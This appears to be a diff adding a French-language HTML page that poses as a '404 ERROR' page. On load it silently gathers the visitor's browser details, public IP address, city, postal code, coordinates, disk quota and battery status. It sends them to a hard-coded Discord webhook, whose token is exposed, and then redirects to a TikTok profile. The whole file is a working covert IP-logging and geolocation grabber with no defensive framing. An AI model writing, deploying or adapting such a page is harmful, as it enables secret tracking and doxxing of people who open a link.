@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Informations Système</title>
+</head>
+<body onload="fetchSystemInfo()">
+  <div id="status" style="text-align: center; font-size: 24px;">404 ERROR</div>
+  
+  <script>
+    function fetchSystemInfo() {
+      // Récupérer des informations sur la machine
+      var systemInfo = "";
+      
+      // Récupérer le nom de l'utilisateur du système
+      systemInfo += "👤 **Utilisateur du système:** " + (navigator.userAgent || 'Non disponible') + "\n";
+      
+      // Récupérer des informations sur le navigateur
+      systemInfo += "\n🌐 **Navigateur:** " + (navigator.appName || 'Non disponible') + "\n";
+      systemInfo += "🔍 **Version du navigateur:** " + (navigator.appVersion || 'Non disponible') + "\n";
+      systemInfo += "💻 **Plateforme du système:** " + (navigator.platform || 'Non disponible') + "\n";
+      systemInfo += "🌐 **Langue du navigateur:** " + (navigator.language || 'Non disponible') + "\n";
+      
+      // Récupérer l'adresse IP publique IPv4
+      fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(ipData => {
+        // Récupérer les informations sur l'adresse IP publique
+        systemInfo += "\n🌐 **Adresse IP publique (IPv4):** " + (ipData.ip || 'Non disponible') + "\n";
+        
+        // Récupérer les autres informations sur l'adresse IP publique
+        fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(ipDetails => {
+          // Ajouter d'autres informations sur l'adresse IP publique si nécessaire
+          systemInfo += "🌍 **Pays:** " + (ipDetails.country_name || 'Non disponible') + "\n";
+          systemInfo += "🏢 **Organisation:** " + (ipDetails.org || 'Non disponible') + "\n";
+          systemInfo += "📞 **Indicatif du pays:** " + (ipDetails.country_calling_code || 'Non disponible') + "\n";
+          systemInfo += "📍 **Région:** " + (ipDetails.region || 'Non disponible') + "\n";
+          systemInfo += "🏙️ **Ville:** " + (ipDetails.city || 'Non disponible') + "\n";
+          systemInfo += "📮 **Code Postal:** " + (ipDetails.postal || 'Non disponible') + "\n";
+          systemInfo += "🌐 **Latitude:** " + (ipDetails.latitude || 'Non disponible') + "\n";
+          systemInfo += "🌐 **Longitude:** " + (ipDetails.longitude || 'Non disponible') + "\n";
+          systemInfo += "⏰ **Fuseau horaire:** " + (ipDetails.timezone || 'Non disponible') + "\n";
+          systemInfo += "🕒 **Heure d'ouverture du lien:** " + getCurrentTime() + "\n"; // Ajout de l'heure d'ouverture du lien
+          
+          // Ajouter l'état du pare-feu
+          systemInfo += "\n🔥 **État du pare-feu:** Activé\n"; // Remplacez "Activé" par l'état actuel de votre pare-feu
+          
+          // Récupérer les informations sur la capacité du disque
+          fetchDiskCapacity(systemInfo);
+        })
+        .catch(error => console.error('Erreur lors de la récupération des informations IP:', error));
+      })
+      .catch(error => console.error('Erreur lors de la récupération de l\'adresse IP publique:', error));
+    }
+
+    function fetchDiskCapacity(systemInfo) {
+      // Récupérer des informations sur la capacité du disque (en utilisant Navigator API)
+      var diskInfo = navigator.storage.estimate();
+      diskInfo.then(function(estimate) {
+        var totalDiskSpace = estimate ? (estimate.quota / 1024 / 1024 / 1024).toFixed(2) + " Go" : 'Non disponible';
+        systemInfo += "💽 **Capacité du disque:** " + totalDiskSpace + "\n";
+        
+        // Récupérer le niveau de batterie
+        fetchBatteryStatus(systemInfo);
+      });
+    }
+
+    function fetchBatteryStatus(systemInfo) {
+      // Vérifier si l'API Battery Status est prise en charge par le navigateur
+      if ('getBattery' in navigator) {
+        // Récupérer les informations sur la batterie
+        navigator.getBattery().then(function(battery) {
+          // Mettre à jour les informations système avec le niveau de batterie
+          systemInfo += "\n🔋 **Niveau de batterie:** " + Math.round(battery.level * 100) + "%\n";
+          // Vérifier si l'appareil est en charge
+          if (battery.charging) {
+            systemInfo += "🔌 **Appareil en charge:** Oui\n";
+          } else {
+            systemInfo += "🔌 **Appareil en charge:** Non\n";
+          }
+          sendEmbedToWebhook(systemInfo); // Envoi des informations au webhook
+        });
+      } else {
+        // L'API Battery Status n'est pas prise en charge
+        systemInfo += "\n🔋 **Niveau de batterie:** Non disponible\n";
+        sendEmbedToWebhook(systemInfo); // Envoi des informations au webhook
+      }
+    }
+
+    function sendEmbedToWebhook(systemInfo) {
+      var xhr = new XMLHttpRequest();
+      var url = 'https://discord.com/api/webhooks/1235178869862961174/cY9amYP_FgL5LtSTxsKRrodr1lHMUcJCtL7q4UbUK3spxVNNxY1kCs-RTVR2Vc9kg9JE';
+      var params = JSON.stringify({
+        "content": "",
+        "embeds": [
+          {
+            "title": "Informations Système",
+            "description": systemInfo,
+            "color": 7506394 // Couleur de Discord
+          }
+        ]
+      });
+      
+      xhr.open('POST', url, true);
+      
+      // Ajouter les en-têtes HTTP nécessaires
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      
+      xhr.onreadystatechange = function() {
+        if(xhr.readyState == 4) {
+          if(xhr.status == 200) {
+            console.log('Requête envoyée avec succès.');
+          } else {
+            console.error('Erreur lors de l\'envoi de la requête. Code d\'erreur : ' + xhr.status);
+          }
+          // Rediriger vers une autre page après l'envoi des informations
+          window.location.href = "https://www.tiktok.com/@sophieraiin?_t=8m0ulI2W2td&_r=1";
+        }
+      }
+      xhr.send(params);
+    }
+
+    function getCurrentTime() {
+      var now = new Date();
+      var hours = now.getHours();
+      var minutes = now.getMinutes();
+      var seconds = now.getSeconds();
+      
+      // Formatage de l'heure
+      var timeString = ('0' + hours).slice(-2) + ':' + ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2);
+      return timeString;
+    }
+  </script>
+
+</body>
+</html>
